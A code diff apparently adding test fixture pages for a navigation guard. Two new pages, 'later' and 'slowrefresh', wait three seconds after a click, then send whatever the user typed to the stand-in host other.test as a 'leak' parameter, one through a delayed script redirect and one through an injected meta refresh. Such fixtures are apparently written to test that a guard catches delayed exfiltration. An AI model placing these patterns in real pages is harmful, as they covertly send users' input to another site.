@@ -82,6 +82,14 @@ const LEAVE = {
 <button id="go" type="button" onclick="location.assign('https://other.test:${port}/?from=assign')">Go elsewhere</button>`),
   blank: (port) => page("A new tab", `<h1>A new tab</h1>
 <a id="new" target="_blank" href="https://other.test:${port}/?from=blank">Open it in a new tab</a>`),
+  // A moment after the click (once the act's own wait is over), by the page itself, carrying what was typed: a script's delayed
+  // assign, and a refresh it adds.
+  later: (port) => page("Save for later", `<h1>Save for later</h1>
+<label for="word">Word</label><input id="word" type="text">
+<button id="later" type="button" onclick="setTimeout(() => location.assign('https://other.test:${port}/?from=later&leak=' + encodeURIComponent(document.getElementById('word').value)), 3000)">Save it later</button>`),
+  slowrefresh: (port) => page("Refresh later", `<h1>Refresh later</h1>
+<label for="word">Word</label><input id="word" type="text">
+<button id="arm" type="button" onclick="const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '3;url=https://other.test:${port}/?from=slowrefresh&amp;leak=' + encodeURIComponent(document.getElementById('word').value); document.head.appendChild(m)">Refresh it later</button>`),
   frame: (port) => page("A frame", `<h1>A frame from elsewhere</h1>
 <iframe id="away" src="https://other.test:${port}/?from=frame" width="300" height="100"></iframe>`),
 };
